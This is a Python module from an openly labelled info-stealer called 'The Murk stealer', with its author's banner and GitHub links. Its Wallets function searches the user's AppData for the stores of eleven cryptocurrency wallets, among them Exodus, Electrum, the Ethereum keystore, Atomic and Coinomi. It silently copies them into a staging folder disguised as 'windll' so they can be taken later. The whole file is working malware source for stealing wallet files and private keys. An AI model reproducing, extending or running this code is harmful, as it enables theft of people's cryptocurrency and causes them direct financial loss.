#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import shutil


def Wallets(data):
    try:
        data.append("\n\n💰Wallets")
        print("w")
        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
        pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        """
        all needed paths
        """
        walletsNames = [
        rf"Zcash",
        rf"Armory",
        rf"Bytecoin",
        rf"com.liberty.jaxx",
        rf"Exodus",
        rf"Ethereum",
        rf"Electrum",
        rf"Atomic",
        rf"Guarda",
        rf"Coinomi",
        rf"FeatherWallet"
        ]
        wallets = [
        rf"\Zcash",
        rf"\Armory",
        rf"\bytecoin",
        rf"\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb",
        rf"\Exodus\exodus.wallet",
        rf"\Ethereum\keystore",
        rf"\Electrum\wallets",
        rf"\atomic\Local Storage\leveldb",
        rf"\Guarda\Local Storage\leveldb",
        rf"\Coinomi\Coinomi\wallets",
        rf"\FeatherWallet"
        ]
        conter  = len(wallets)
        try:
            for i in range (conter):
                try:
                    if (i != 3 and i != 7 and i != 8):
                        #print(wallets[i],"  if")
                        shutil.copytree(rf"{pathtofile}{wallets[i]}",rf"{pathtofolder}\windll\wallets{wallets[i]}")# copy dirs
                    else:
                        #print(wallets[i],"  else")
                        num = wallets[i].rfind("\\")
                        #print(wallets[i][:num+1])
                        shutil.copytree(rf"{pathtofile}{wallets[i][:num+1]}",rf"{pathtofolder}\windll\wallets{wallets[i][:num+1]}")# copy dirs
                    data.append(f"\n∟{walletsNames[i]}")
                except Exception as e:
                    print(e)
            return data
        except Exception as e:
            pass
    except:
        return data
